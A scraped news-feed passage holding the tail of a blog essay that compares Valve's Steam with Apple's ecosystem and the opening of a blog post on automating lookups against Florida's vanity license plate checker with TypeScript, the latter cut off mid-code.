subscribers</a><span>, about </span><a href="https://www.cnbc.com/2025/05/14/netflix-ad-tier-monthly-active-users.html" rel="">100 million of whom are on the ad-supported tier</a><span>.</span></p></li><li><p><span>Uber reported ~190 million MAPC (Monthly Active Platform Consumers, i.e. “people who took a ride or bought Uber Eats delivery”) </span><a href="https://investor.uber.com/news-events/news/press-release-details/2025/Uber-Announces-Results-for-Third-Quarter-2025/default.aspx" rel="">for the most recent quarter</a><span>.</span></p></li><li><p><span>eBay has ~</span><a href="https://investors.ebayinc.com/fast-facts/default.aspx" rel="">135 million “Active Buyers”</a><span> (defined as an account that made a purchase in the last </span><em><strong>year</strong></em><span>).</span></p></li></ul></li></ul></li></ul><p>Many may be surprised to learn that the Steam Machine being released in 2026 is actually Steam Machine 2.0. Valve, for its part, seems to be tacitly trying to memory-hole the earlier model; essentially none of the messaging about the new release brings up the fiasco from a decade prior. However, it’s clear that Valve has internalized a lot of the failures from that affair:</p><p>It’s a perceived truism in the games industry that platform exclusives drive platform adoption. While I think this is on the whole significantly overstated, and it seems like the industry itself might be coming around on that, it’s hard to deny that the fact that many major games just didn’t run on the original Steam Machine’s software could hardly be called a selling point:</p><blockquote><p>Probably the biggest issue holding back the Steam Machine at launch was the [...] fact they only run games that have Linux versions. Three of the platform’s biggest titles in recent years: The Witcher 3, Grand Theft Auto 5, and Metal Gear Solid V, still aren’t supported, which is a big problem for a machine aimed at gamers.</p></blockquote><p><span>(</span><a href="https://www.techspot.com/article/1416-steam-machines-what-happened/" rel="">The Steam Machine: What Went Wrong | TechSpot</a><span>, 2017)</span></p><p><span>Even looking at the games that were supported, </span><a href="https://arstechnica.com/gaming/2015/11/ars-benchmarks-show-significant-performance-hit-for-steamos-gaming/" rel="">they performed worse on SteamOS than they did on Windows</a><span>… which ties into the next point:</span></p><p><span>Steam Link, </span><a href="https://www.engadget.com/2015-03-03-50-steam-link-streams-pc-games-anywhere-within-your-house.html" rel="">launched in 2015</a><span>, allowed owners of (sufficiently powerful) PCs to stream games to the TV over your (hopefully uncluttered) WiFi network at a lower price point.</span></p><p>What did that mean? You had two options:</p><ol><li><p>Purchase a new machine that cost anywhere from $500 to thousands and hook it up to your TV; or</p></li><li><p>Purchase a little stick for $50 and use the PC you probably already gamed on before all this as a local server for your games. You know, that PC running Windows, which apparently runs those games better anyway.</p></li></ol><p>Gosh, I wonder which one consumers would want? /s</p><p>For this one, I’m just going to quote directly from another publication that ran a postmortem article on all this about a decade ago:</p><blockquote><p>“We started thinking, ‘Hey, you know, we’re actually creating a middle-tier niche for this at this point,’” says [Michael Hoang, marketing manager @ iBuyPower]. “You have your console, you have your PC gamers, we’re right in between. We’re right in the middle where no one can really claim which one this is. So now we’re creating a new demographic that has never been created, so we have to do everything from the ground up at this point. And it was very, very hard to convince people, well, do I want to be a PC gamer? Do I want to stick with just being console? Or this new thing in the middle.</p></blockquote><p><span>(</span><a href="https://www.pcgamer.com/what-happened-to-steam-machines/" rel="">What happened to Steam Machines? | PC Gamer</a><span>, originally published 2017, re-published 2018)</span></p><p>How does this compare to the situation in 2022 (with the Steam Deck) or 2026 (Machine 2.0)?</p><p><span>On the back of years of testing/improvements and launch of the Steam Deck, the Proton gaming compatibility layer for Linux means even some brand new games can, out of the box, often “just work” on SteamOS without tuning. </span><a href="https://www.protondb.com/" rel="">ProtonDB tracks compatibility</a><span>, and counts 7000+ games that are verified to work as well or almost as well as on Windows, and when sorting games by popularity on Steam (i.e. the main platform), you have to pass more than 40 at time of writing before you get one that isn’t at least “Gold” rated.</span></p><p><span>While the software still technically exists and is usable, </span><a href="https://www.techpowerup.com/249782/valve-says-goodbye-to-steam-link-but-will-continue-to-offer-support" rel="">the hardware is dead</a><span>, and even the software has “better” open source alternatives that are recommended by the community as the go-to solutions (ref: </span><a href="https://old.reddit.com/r/SteamOS/comments/1dd8w23/steam_link_in_2024/" rel="">Moonlight/Sunshine</a><span>).</span></p><p><span>This one is less clear; while (at time of writing) the pricing of Steam Machine 2.0 is not confirmed, it has been stated that </span><a href="https://www.pcgamer.com/hardware/valves-decision-not-to-sell-the-steam-machine-at-a-loss-isnt-stupid-but-it-is-peculiar-says-baldurs-gate-3-publishing-boss/" rel="">it won’t be sold at a loss</a><span> despite only having the hardware to be performance-competitive with current-gen consoles (which </span><em>are</em><span> sold at a loss, and so would be expected to be cheaper). At a glance, it seems like Valve is setting themselves up for the same “are we PC gamers, console gamers, or something in the middle” question all over again.</span></p><p><span>However, there’s an argument to be made that, if the Steam Deck is the iPhone of gaming, then the Steam Machine is the iPad – an interoperable, friction-free extension of the software to a new form factor, built to fulfill a complementary purpose to the Deck. Moreover, “a slightly more expensive console” is an easier sell when you can </span><em>also</em><span> play your games on the go with the Steam Deck, in that (again) it centralizes your library.</span></p><p>Returning to the earlier-mentioned PC Gamer post-mortem:</p><blockquote><p>What’s the best thing to come of iBuyPower’s SBX? The LED strip, says Hoang, which looked really nice.</p></blockquote><p>Now, taking a look at the Steam Machine store page:</p><p>Jokes aside, I think Valve’s biggest takeaways from the debacle that was “Steam Machine 1.0” was that, for their vision of hardware to make sense as a customer purchase, it need to be smooth; they couldn’t just ship an MVP and build on it later, or rely on third-party partners specialized in hardware to build the rig while they made the software and hope that the two would meet in the middle. No, they needed to control the hardware, the software, the interface, the messaging, everything.</p><p><span>They learned that it all needed to “</span><a href="https://www.youtube.com/watch?v=qmPq00jelpc" rel="">just work, seamlessly</a><span>”.</span></p><p>The parallels aren’t only in their trajectories and ultimate product offerings, though. A deeper examination of what makes these companies unique and valuable reveals more similarities, which is perhaps unsurprising considering that they are both also very, very successful.</p><p>Both Jobs and Newell view(ed) digital asset piracy as a problem of availability and convenience.</p><p>Jobs:</p><blockquote><p>We believe that 80 percent of the people stealing stuff don’t want to be; there’s just no legal alternative. So we said, Let’s create a legal alternative to this. Everybody wins. Music companies win. The artists win. Apple wins. And the user wins because he gets a better service and doesn’t have to be a thief.</p></blockquote><p><span>(</span><a href="https://www.esquire.com/news-politics/a11177/steve-jobs-esquire-interview-0703/" rel="">Esquire Magazine Interview, 2003</a><span>)</span></p><p>Newell:</p><blockquote><p>“We think there is a fundamental misconception about piracy. Piracy is almost always a service problem and not a pricing problem,” [Newell] said. “If a pirate offers a product anywhere in the world, 24 x 7, purchasable from the convenience of your personal computer, and the legal provider says the product is region-locked, will come to your country 3 months after the US release, and can only be purchased at a brick and mortar store, then the pirate’s service is more valuable.”</p></blockquote><p><span>(2011, proxied quote from </span><em><a href="https://web.archive.org/web/20220924191721/https://www.tcs.cam.ac.uk/interview-gabe-newell/" rel="">The Cambridge Student</a></em><span> via </span><em><a href="https://www.escapistmagazine.com/valves-gabe-newell-says-piracy-is-a-service-problem/" rel="">The Escapist</a></em><span>; thanks to teddyh on HackerNews for digging up the archive link for TCS!)</span></p><p>This take by Newell is borne out by results, as he goes on to explain:</p><blockquote><p>“Prior to entering the Russian market, we were told that Russia was a waste of time because everyone would pirate our products. Russia is now about to become [Steam’s] largest market in Europe,” Newell said.</p></blockquote><p>While Jobs is providing an optimistic view on people’s morals and Newell is looking more clinically at overall value like an economist, they both point at the same underlying idea, i.e. “users will pay for a good experience”. We return again to Jobs’s famous refrain of “it just works” – and customers will pay you when it does.</p><p><span>When Steve Jobs died in 2011, people left flowers at Apple stores. When Gabe Newell so much as posts on Reddit, </span><a href="https://old.reddit.com/r/Steam/comments/1gwmwnu/seriously_what_happens_when_gabe_is_gone/" rel="">threads debating what happens to Steam without him</a><span> rack up thousands of upvotes and comments. Both companies have fanbases that behave less like customers and more like congregations.</span></p><p><span>Even after almost 15 years of Tim Cook at its head, when you think “Apple”, you think of the iconic image of Steve Jobs looking directly at the camera with his hand on his chin that </span><a href="https://upload.wikimedia.org/wikipedia/en/e/e4/Steve_Jobs_by_Walter_Isaacson.jpg" rel="">became the cover of Walter Isaacson’s biography</a><span>. Jobs’s ideas around design as the lodestone of product development, his relentless focus on the customer experience, his love for simplicity – all of these are written into Apple’s very DNA and are the exact things customers love about their products.</span></p><p><span>While the general public might not recognize the name, Gabe Newell is the same in gaming circles. One need look no further </span><a href="https://old.reddit.com/r/Steam/comments/1o8xi3f/gabe_newell_on_his_celebrity_status_i_like_our/" rel="">than even reactions from those fans</a><span> when Gabe Newell questions his own celebrity treatment. And just like Apple, this cult-like veneration extends to the company itself – despite having been almost 20 years since the last mainline entry in the </span><em>Half-Life</em><span> series, memes and (half-?)jokes about “Half-Life 3 when” have not died down, and when Valve announced a prequel VR game in the series due to release in 2020, </span><a href="https://www.roadtovr.com/half-life-alyx-trailer-views-mainstream-gaming-spotlight/" rel="">the trailer racked up 10 million views in less than 24 hours</a><span>… and, of course, prompted </span><a href="https://www.techradar.com/nz/news/half-life-alyx-is-anything-but-half-life-3" rel="">a fresh wave of “Half-Life 3 when?”</a></p><p>This phenomenon of fandom cannot be viewed as anything but a competitive advantage. Both companies have audiences that will literally hold off on buying things in case their “preferred” creator might enter the space, and watch their every move like hawks to determine what to “get hype” for.</p><p>Valve and Apple do differ in one major respect, however: Valve seems staunchly unwilling to pursue any explicit, strong lock-in.</p><p><span>Unlike Apple hardware, the Steam Deck does not need to be jailbroken in any way, and Valve explicitly </span><a href="https://help.steampowered.com/en/faqs/view/671A-4453-E8D2-323C" rel="">provides a guide</a><span> for how to go outside their ecosystem (and potentially brick your very expensive game machine). The messaging for the Steam Machine 2.0 seems equally “free”:</span></p><blockquote><p>Yes, Steam Machine is optimized for gaming, but it’s still your PC. Install your own apps, or even another operating system. Who are we to tell you how to use your computer?</p></blockquote><p><span>(</span><a href="https://store.steampowered.com/sale/steammachine" rel="">Steam Machine product page</a><span>)</span></p><p>A useful lens for understanding the dynamics at play when talking about Valve/Steam is that of Aggregation Theory.</p><p>Aggregation Theory is a model and way of thinking about businesses enabled by the Internet and digitization, conceived and coined by Ben Thompson of Stratechery. Thompson labels “Aggregators” as businesses having three core characteristics:</p><ol><li><p>A Direct Relationship with Users</p></li><li><p>Negligible Marginal Cost for Additional Users</p></li><li><p>Demand-Driven Markets with Decreasing Acquisition Costs</p></li></ol><p><span>Is that a mouthful? Yes, and the big words hide a lot of complexity. For those who want to really understand it (something I encourage, as I think that a lot of both the successes and failures in recent times of tech companies, whether in product strategy or regulation, come from a misunderstanding of these dynamics), I’d encourage going to the source and spidering out to related, mentioned articles (Thompson does such a great job at linking between his pieces that I’m tempted to </span><a href="https://xkcd.com/609/" rel="">provide a quasi-TVTropes warning first</a><span>):</span></p><ul><li><p><a href="https://stratechery.com/2015/aggregation-theory/" rel="">https://stratechery.com/2015/aggregation-theory/</a></p></li><li><p><a href="https://stratechery.com/2017/defining-aggregators/" rel="">https://stratechery.com/2017/defining-aggregators/</a></p></li></ul><p>However, for our purposes, I think we only need to engage with the concept at a high level.</p><p><span>Consider AirBnB (which might not initially seem like an aggregator), an example Thompson himself brings up often. Homesharing wasn’t a new concept that sprung fully-formed from Brian Chesky’s forehead; couchsurfers and foreign exchange students engaged in it for decades. What AirBnB did was </span><em>aggregate demand</em><span> – they made it trivially easy to find a nice place to stay. Once enough travelers were searching on AirBnB, hosts “had to be there”. Once enough hosts were listed, why would travelers look elsewhere? The platform became the default not by being the only option, but by being </span><em>the most convenient</em><span>.</span></p><p>In this regard, Steam works the same way.</p><p>Steam is inarguably an aggregator, and arguably close to the platonic ideal of one:</p><ol><li><p><span>Direct Relationship with Users – As a customer, you make an account with Steam to activate products managed through it. While you don’t </span><em>have</em><span> to give them your payment information, it’s certainly more convenient to do so. It would almost require active commitment to avoid doing so: you’d have to exclusively buy game keys from other retailers, handle any and all in-game purchases directly with the game creators (if even possible), and deny yourself the ability to buy anything during the ever-rotating Steam Store sales that often feature deep discounts on a wide swath of games.</span></p></li><li><p>Negligible Marginal Cost for Additional Users – Steam is a digital storefront, so yes. Additional users are just an O(1) addition of rows in a few database tables. And while Steam obviously incurs some transaction costs when users buy things, who doesn’t pay the gatekeepers of Visa and Mastercard?</p></li><li><p><span>Demand-Driven with Decreasing Acquisition Costs – Steam is practically self-sustaining on both sides of its market. Customers not already on Steam are liable to wind up there by accident just buying a box copy of some game or another. That mass of users attracts developers, both small and large, even </span><a href="https://www.pcgamer.com/gaming-industry/ubisoft-comes-crawlin-back-to-steam/" rel="">ones that left</a><span> believing their fans would follow.</span></p></li></ol><p>As a platform, Steam is also increasing lock-in:</p><ul><li><p>SteamVR serves as the “platform” for VR development, driven by customer demand for Half-Life: Alyx, with the Steam Frame as the first-party platform (alongside already-existing VR hardware options like HTC Vive or Oculus Quest)</p></li><li><p><span>The Steam Deck functions as the “</span><a href="https://www.ign.com/articles/steam-deck-impact-apple-iphone-gabe-newell-demand" rel="">iPhone for PC gaming</a><span>” (direct quote from GabeN)...</span></p></li><li><p>And now comes the Steam Machine to complete a “hardware trifecta” to mirror the iPad.</p></li></ul><p>All of these hardware offerings are undergirded by the self-lock-in of users who have a significant portion (sometimes a supermajority) of their gaming libraries in Steam, which is (currently) non-transferable (c.f. iTunes/App Store/iCloud)</p><p>In this light, the parallels to Apple are hard not to see, but Apple “integrated forward” – they created great hardware that brought customers to them first, then slowly built the pretty walls around the garden users had entered, even as the garden itself expanded into new domains like mobile and watches.</p><p>Valve, by contrast “integrated backward” – they created the ecosystem first, offering both customers and developers amenities like managed updates, cloud saves, mod hosting, and content distribution networks before creating their own first-party hardware that leverages all that work.</p><p>A core contributor to the success of both Apple and Valve is that they both grew naturally (if in inverse directions):</p><ul><li><p>Apple went from PCs, to laptops, to portable music, to smartphones as a generalization of their learnings from ‘portable music’, and finally to the modern ecosystem of software &amp; peripherals (watches, headphones, VR).</p></li><li><p>Valve started in video games, then made a game launcher/update manager for their games, then offered that update management service to other developers with a storefront before finally getting to the hardware.</p></li></ul><p>At each step, both companies responded to real market demand and simply did a better job at capturing that demand through UX. You can even see the proof by contradiction: The Steam Machine 1.0 shows where they perhaps moved too early or chased illusory demand, and a similar story may be repeating itself with Apple Vision.</p><p>It’s instructive to contrast this with Facebook’s “all-in” pivot to metaverse. At first blush, there are significant parallels to Valve, in that both Zuckerberg and Newell had built their fiefdoms in the lands of other empires and were trying to “escape their jailers”:</p><ul><li><p>Newell was trying to get out of “Windows 8 jail” and the potential that Microsoft might smother their business with expansion of the Xbox business.</p></li><li><p><span>Zuckerberg wanted to leave the Apple/Google app platforms of iOS and Android, where their decisions around privacy could kneecap FB profits (ref: iOS’s </span><a href="https://www.cnbc.com/2022/02/02/facebook-says-apple-ios-privacy-change-will-cost-10-billion-this-year.html" rel="">App Tracking Transparency</a><span> initiative), and run his own platform from which to derive value (or, being more cynical, collect rent).</span></p></li></ul><p>However, it’s hard to imagine a bigger gap in outcomes between the two. Looking at the result of Facebook’s metaverse efforts in December 2025:</p><ul><li><p>A stagnant Quest store/ecosystem</p></li></ul><ul><li><p>70 billion dollars in losses associated with the pivot</p></li><li><p>4 years invested for no meaningful revenue growth</p></li><li><p><a href="https://www.bloomberg.com/news/articles/2025-12-04/meta-s-zuckerberg-plans-deep-cuts-for-metaverse-efforts" rel="">Planned 10-30% cuts to Metaverse</a></p><ul><li><p>Perhaps most depressingly, investors drove stock 3-5% higher following release of news, indicating they were also fed up with this nonsense.</p></li></ul></li></ul><p>Why? Well, Zuckerberg’s big pivot was completely unbacked in demand, whether from customers or enterprises, to match the scale of the investment he decided to fling at it. Moreover, it had an at-best tenuous connection to the core competencies that Facebook had developed in scalable software, social networks, and advertising. Zuckerberg often talked about how everyone would interact with virtual avatars while on the go or in meetings across timezones or what have you, and how that tied into Facebook’s mission of connecting people, but as the saying goes: if you need to explain the joke, it isn’t funny.</p><p>All of this analysis begs the question: What sayeth the crystal balls?</p><p>If we’re looking at things as Aggregation Theorists, continued near-total monopoly is the obvious end result, absent significant developments:</p><blockquote><p>What is important to note is that in all of these examples there are strong winner-take-all effects. All of the examples I listed are not only capable of serving all consumers/users, but they also become better services the more consumers/users they serve — and they are all capable of serving every consumer/user on earth.</p></blockquote><p><span>(</span><a href="https://stratechery.com/2015/aggregation-theory/" rel="">Aggregation Theory | Stratechery</a><span>, 2015)</span></p><p>Competition is difficult once a big aggregator has emerged, even for deep-pocketed incumbents. One need only look at famous examples like Yahoo or Bing vs Google, or Walmart vs Amazon. Epic Games already tries to offer competition in digital storefronts by leveraging the breakout success of Fortnite to launch their Epic Games Store, with a more generous revenue split for developers and the backing of Tencent to buy up store exclusives (even if timed only) by flinging money around. However, 7 years into the experiment, these terms don’t seem to have resulted in any significant upturning of the apple cart.</p><p><span>Ben Thompson (of Stratechery) suggests that traditional platforms might offer an avenue by which competition can rise, </span><a href="https://stratechery.com/2019/shopify-and-the-power-of-platforms/" rel="">looking at Shopify vis a vis Amazon</a><span>. However, it’s unclear what “a platform approach” might look like as competition in the context of gaming here. Indeed, if you asked me what an extensible platform might look like in gaming, I’d say that Valve are, themselves, operating closer to a platform than a straightforward aggregator by making Proton/SteamOS free for other companies to use and potentially develop on top of (ref: Lenovo Legion Go S and ASUS ROG Ally as competitors to Steam Deck that can use Proton/SteamOS (though by default ship with Windows 11)).</span></p><p>So, if the traditional mechanisms of the market find no purchase, might we look elsewhere?</p><p><span>Antitrust is also hard, at least based on dominant US thought. Those who know me personally will know that I’ve long railed against Robert Bork’s </span><a href="https://en.wikipedia.org/wiki/Consumer_welfare_standard" rel="">consumer welfare standard</a><span> for evaluating mergers and antitrust.</span></p><p><span>I’m hardly the first or alone in this – perhaps most notably, former FTC Chair and current Mamdani transition team member Lina Khan first made her name penning “</span><a href="https://yalelawjournal.org/note/amazons-antitrust-paradox" rel="">The Amazon Antitrust Paradox</a><span>” as a direct refutation of Bork’s ideas. However, despite some recent small shifts suggesting that the climate may be changing, it remains </span><strong>the</strong><span> default standard, and considering that users specifically </span><em>choose</em><span> to go to the aggregators due to the benefits they offer (whether on price or quality), consumer welfare seems unlikely to find any justification for action.</span></p><p><span>However, there are potential avenues in forced service interoperability and data portability. In short, the idea is that regulations can mandate that platforms of sufficient size have to allow other services to be able to integrate in some (perhaps standardized, limited) ways with the incumbent giants. This is an idea that’s already being trialed by the EU via the Digital Markets Act (DMA) for messaging (even despite </span><a href="https://www.eff.org/deeplinks/2022/04/eu-digital-markets-acts-interoperability-rule-addresses-important-need-raises" rel="">some real and valid technical concerns</a><span>), and it’s also being partially (voluntarily, seemingly) rolled out in music streaming apps (</span><a href="https://dtinit.org/blog/2024/08/27/DTI-members-new-music-tool" rel="">specifically between Apple Music and YouTube Music</a><span>). While it’s early days, if these initial forays work without significant snags, it may embolden other legislatures to make similar moves that ultimately wind up hitting Steam, forcing it to cooperate with EGS in some way like allowing Steam users to take their validly purchased games to EGS if they want.</span></p><p><a href="https://pluralistic.net/2023/01/21/potemkin-ai/#hey-guys" rel="">Cory Doctorow’s pithy (if crude) term and model</a><span>, which posits that platforms are eventually incentivized to ruin the experience for everyone on them in search of profit, might credibly be argued to be the end state of all platforms controlled by profit-seeking entities. And arguably, Steam has long since been “enshittified” in some regards. The deluge of games on the store that are approved for release without quality control has led to </span><a href="https://www.gamesindustry.biz/valve-removes-173-asset-flipping-games-from-steam" rel="">cheap, buggy messes</a><span> or even </span><a href="https://www.malwarebytes.com/blog/news/2025/07/steam-games-abused-to-deliver-malware-once-again" rel="">outright malware</a><span> finding their way onto customer machines. This is not a new problem, either, with </span><a href="https://www.youtube.com/watch?v=5svAoQ7D38k" rel="">industry analyst and pundit James Stephanie Sterling having coined the term “the asset flip” in 2015</a><span> to describe a problem that has only grown in scope since.</span></p><p>However, while that criticism might hold water for some industry professionals, power-users, and gaming enthusiasts who want to find “hidden gems”, for the average consumer, Steam generally remains a good experience for discovery, purchase, and library management.</p><p>Looking forward, as a private company that is majority owned by Gabe Newell himself, Valve is not as vulnerable to the kinds of short-term shareholder pressures that public companies or heavily venture-funded companies like Facebook/Bytedance face. While that alone is no guarantee, the combination of profitability, patient capital, and founder control may stave off the specter of enshittification for some time yet, at least while current leadership remains.</p><p>That is, however, also why, as mentioned earlier, many fans fret about what might happen to Steam and Valve in the absence of GabeN.</p><p>While it’s hard to say what direction technology might go in the future (who could’ve predicted in Oct 2022 that the US economy’s growth would hinge on LLMs?), there is one obvious avenue that may pose a threat: Cloud Gaming is only getting better.</p><p>Surfaces like Xbox Cloud Gaming or Nvidia GeForce Now are currently only either technological solutions that allow access to existing libraries (e.g. Steam or EGS via Nvidia GeForce Now) or Netflix-esque “subscription packages” for pre-selected games. However, there’s no technological reason preventing these providers from attempting to fight with Steam as a digital storefront; Google Stadia already tried this in a form, and while that service was eventually shut down, there’s nothing to suggest that the idea itself is inherently unworkable. If these services want to become “the Uber for gaming”, a storefront may eventually be a necessity; many of these services already have experimented with messaging of “pay-as-you-go” for gaming hardware, gesturing at a future where you never have to worry about hardware compatibility or drivers because it “runs in the cloud”, all of which is reminiscent of the “you won’t need to own a car, a self-driving one will just come pick you up” vision pitched by Uber or Tesla in years past.</p><p><span>If you were to ask me where things likely go from here, I’d say Valve will remain the much-beloved </span><em>de facto</em><span> king of PC gaming for the foreseeable future. This isn’t because they’re inherently more talented or virtuous, but because the factors for decay just aren’t there. They’re private, they’re profitable, and (if nothing else) they’re patient (Half-Life 3 when, GabeN?). There’s no strong incentive for them to enshittify.</span></p><p>The parallel to Apple isn’t perfect, though; the companies have taken different directions in some aspects. The more open approach Valve has taken with Proton and SteamOS is perhaps the most obvious, and I personally consider that to be a strength, especially in the context of regulation. However, there are other differences as well, and the one that stands out to me is in social infrastructure.</p><p><span>If I say “blue and green bubbles”, the direction I’m pointing at should become clear. Apple has leveraged their branding and dominant position (at least within the US) to elevate the iPhone to a status symbol, and in so doing has created network effects through iMessage and Facetime that further keeps their customers within their ecosystem in a way akin to traditional social networks (“I can’t leave Facebook; that’s how I keep in touch with my high school buddies!”). By contrast, while Steam does have chat and groups and forums and other social features, calling them “anemic” might be generous. When it comes to PC gaming, while most things make you think Valve and Steam, if you talk about social lock-in, it’s </span><em>Discord</em><span> that comes to mind, and that’s a chink in the fortress Valve has built.</span></p><p>The question is, will social infrastructure be as critical in gaming platform lock-in as it has been to mobile? If Apple’s trajectory is any guide – iMessage didn’t seem critical until it revealed itself as one of their strongest moats – owning the social layer may matter more than is obvious today.</p></div></article></div><div><div id="discussion"><h4>Discussion about this post</h4></div><div><h3>Ready for more?</h3></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Beginning January 2026, all ACM publications will be made open access (1729 pts)]]></title>
            <link>https://dl.acm.org/openaccess</link>
            <guid>46313991</guid>
            <pubDate>Thu, 18 Dec 2025 15:39:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dl.acm.org/openaccess">https://dl.acm.org/openaccess</a>, See on <a href="https://news.ycombinator.com/item?id=46313991">Hacker News</a></p>
Couldn't get https://dl.acm.org/openaccess: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Using TypeScript to Obtain One of the Rarest License Plates (166 pts)]]></title>
            <link>https://www.jack.bio/blog/licenseplate</link>
            <guid>46313379</guid>
            <pubDate>Thu, 18 Dec 2025 15:00:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jack.bio/blog/licenseplate">https://www.jack.bio/blog/licenseplate</a>, See on <a href="https://news.ycombinator.com/item?id=46313379">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p>Most people never think twice about the random mix of letters and numbers the DMV assigns them.</p>
<p>I'm not one of those people.</p>
<p>Online, I've always chased having a clean and memorable digital identity. Over the years, I've been able to pick up handles like my first + last name on Instagram (@jlaf) and full words across platforms (@explain, @discontinue). So when the DMV mailed me my third reminder to renew my registration, that same instinct kicked in: why <em>hadn't</em> I considered getting a distinctive plate combination of my own?</p>
<p>In the world of license plates exists a rarity hierarchy:</p>
<ul>
<li>Single number license plates (10 possible)</li>
<li>Repeating number license plates (10 possible)</li>
<li>Single letter license plates (26 possible)</li>
<li>Repeating letter combinations (??? possible)</li>
<li>Two letter plate combinations (676 possible)</li>
</ul>
<p>After some research about the history these rare plates, my curiosity got the best of me. How rare could you really go? And how far can you push a state's public lookup tools to find out?</p>
<h2>PlateRadar &amp; the Monopoly</h2>
<p>As it stands right now, there's a single resource to find mass information on license plate availability: PlateRadar. PlateRadar, like any smart website, recognizes that this data is definitely worth something to someone - and as a result, hides any information that might be deemed rare behind a 20 dollar a month paywall. The site also refreshes every 24 hours, and from my history with rare usernames I know that time is of the absolute essence when snagging something rare. 24 hours wasn't going to cut it.</p>
<p><img src="https://www.jack.bio/images/licenseplate/one.png" alt="Image.png"></p>
<p><img src="https://www.jack.bio/images/licenseplate/two.png" alt="Image.png"></p>
<p>Unfortunately for PlateRadar, I'm an engineer and not a normal human being, so I decided to dig in on how vanity plates are deemed available or unavailable.</p>
<h2>Florida's Vanity Plate Checker</h2>
<p>Florida, unlike some states (!), provides a website that allows you to check a license plate configuration (meaning the custom sequence of letters/numbers that you want printed on your plate) before you waste your time sitting in line at the tax collector's office. The tool also provides the plate types that support that combination, as different plates also allow different character limits (for example, some only permit 5 characters while allow others up to 7 characters).</p>
<p><img src="https://www.jack.bio/images/licenseplate/three.png" alt="Image.png"></p>
<p>Thankfully, the site had the nifty feature to check more than a single combination at a time, with no additional delay in the request. I was submitting some combinations manually before realizing that I was able to make requests pretty fast manually - so what if I just automated this whole process?</p>
<h3>The Rate is Limitless</h3>
<p>I fired up Burp Suite and proxied a request to the service. What came through looked like this:</p>
<pre data-theme="unknown" data-lang="txt" data-ch="true"><div><p><span>POST https://services.flhsmv.gov/mvcheckpersonalplate/ HTTP/1.1</span>
</p><p><span>__VIEWSTATE=/wEPDwULLTE2Nzg2NjE0NDgPZBYCZg9kFgICAw9kFgICAQ9kFgwCBQ8PFgIeBFRleHQFCUFWQUlMQUJMRWRkAgcPDxYCHgdWaXNpYmxlZ2RkAgsPDxYCHwAFASBkZAIRDw8WAh8ABQEgZGQCFw8PFgIfAAUBIGRkAh0PDxYCHwAFASBkZGQZj5Nowpt7uQW4i5K8gYM8k2+WSv9Zz0wpvFKj57zF0w==</span>
</p><p><span>__VIEWSTATEGENERATOR=0719FE0A</span>
</p><p><span>__EVENTVALIDATION=/wEdAAlM0TkirL0XIlY9Dw0k/5tSphigSR1TLsx/PgGne7pkToFkrQPgalhmo+FySJy6U4iQeyzYgJga2PpZFeMkYbpKuFA0Lbs4tsi+aCEe29qpNhTkiCU5GKYk9WuPyhuiSM5sZFBTNc+Q1lCok0SfYOt8+CHI2KGhrgOke/DbhB4LDccabLrTZbd0ckqhWOrhQ2MjwxuXnk/njUGbYQbYHdP4Ds+OFyUVKVe45DGbH/0quQ==</span>
</p><p><span>ctl00$MainContent$txtInputRowOne=MYPLATE</span>
</p><p><span>ctl00$MainContent$txtInputRowTwo</span>
</p><p><span>ctl00$MainContent$txtInputRowThree</span>
</p><p><span>ctl00$MainContent$txtInputRowFour</span>
</p><p><span>ctl00$MainContent$txtInputRowFive</span>
</p><p><span>ctl00$MainContent$btnSubmit=Submit</span></p></div></pre>
<p><code><span>__VIEWSTATE</span></code>, <code><span>__VIEWSTATEGENERATOR</span></code>, and <code><span>__EVENTVALIDATION</span></code> immediately tipped me off that this was an ASP.NET Web Form. Granted, this is a government website, so honestly, what else was I expecting?</p>
<p>EVENTVALIDATION is (was?) a novel security measure implemented in 2006 by the ASP.NET team to <em>"prevents unauthorized requests sent by potentially malicious users from the client [..] to ensure that each and every postback and callback event originates from the expected user interface elements, the page adds an extra layer of validation on events".</em></p>
<p>In practice, it's meant to stop forged form submissions, which theoretically sounds like a scraping killer. If I had to fetch a fresh set of these variables before making any form of a request, I'd quickly overwhelm the system with round-trips and get rate-limited almost immediately.</p>
<p>... except there was no ratelimiting. At all.</p>
<p>See, the website had absolutely zero CAPTCHA, IP ratelimiting, or web application firewall stopping an influx of requests from coming in. I quickly verified this by using Burp Repeater to make a number of null payload requests, which all returned a status code of 200 Successful.</p>
<p>Once I realized this, I quickly threw a script together to automate the entire process. The workflow looks something like this:</p>
<ol>
<li>Fetch the page once using real browser headers, which loads the ASP.NET form and gives me <code><span>__VIEWSTATE</span></code>, <code><span>__VIEWSTATEGENERATOR</span></code> and <code><span>__EVENTVALIDATION</span></code> - and the power to make a legitimate POST request.</li>
<li>Extract the values from the form using a Regex helper.</li>
</ol>
<pre data-theme="unknown" data-lang="typescript" data-ch="true"><div><p><span>function</span> <span>extractFormFields</span><span>(</span><span>html</span><span>:</span> <span>string</span><span>)</span><span>:</span> <span>{</span>
</p><p><span>viewState</span><span>:</span> <span>string</span><span>;</span>
</p><p><span>viewStateGenerator</span><span>:</span> <span>string</span><span>;</span>
</p><p><span>eventValidation</span><span>:</span> <span>string</span><span>;</span>
</p><p><span>} {</span>
</p><p><span>const</span> <span>viewStateMatch</span> <span>=</span> <span>html</span><span>.</span><span>match</span><span>(</span><span>/id="__VIEWSTATE"\s</span><span>+</span><span>value="([</span><span>^</span><span>"]</span><span>+</span><span>)"/</span><span>)</span><span>;</span>
</p><p><span>const</span> <span>viewStateGeneratorMatch</span> <span>=</span> <span>html</span><span>.</span><span>match</span><span>(</span>
</p><p><span>/id="__VIEWSTATEGENERATOR"\s</span><span>+</span><span>value="([</span><span>^</span><span>"]</span><span>+</span><span>)"/</span>
</p><p><span>)</span><span>;</span>
</p><p><span>const</span> <span>eventValidationMatch</span> <span>=</span> <span>html</span><span>.</span><span>match</span><span>(</span>
</p><p><span>/id="__EVENTVALIDATION"\s</span><span>+</span><span>value="([</span><span>^</span><span>"]</span><span>+</span><span>)"/</span>
</p><p><span>)</span><span>;</span>
</p><p><span>if</span> <span>(</span><span>!</span><span>viewStateMatch</span> <span>|| !</span><span>viewStateGeneratorMatch</span> <span>|| !</span><span>eventValidationMatch) {</span>
